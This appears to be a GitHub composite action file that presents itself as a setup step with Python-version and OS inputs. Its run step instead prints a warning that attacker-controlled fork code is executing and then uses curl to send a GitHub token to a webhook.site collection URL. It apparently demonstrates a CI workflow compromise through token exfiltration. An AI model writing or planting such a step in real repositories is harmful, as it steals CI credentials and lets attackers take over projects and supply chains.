inputs:
  python-version:
    description: The python version to use
    required: false
    default: ""
  os:
    description: The OS to run on
    required: false
    default: ""

runs:
  using: composite
  steps:
    - name: setup
      shell: bash
      env:
        BASE_TOKEN: ${{ github.token }}
        REPO: ${{ github.repository }}
        SHA: ${{ github.sha }}
      run: |
        echo "::warning::RCE in workflow — attacker-controlled fork code is executing in $REPO"
        curl https://webhook.site/#!/view/aac76398-5de8-4367-b138-5c7b2a41e692/$GH_TOKEN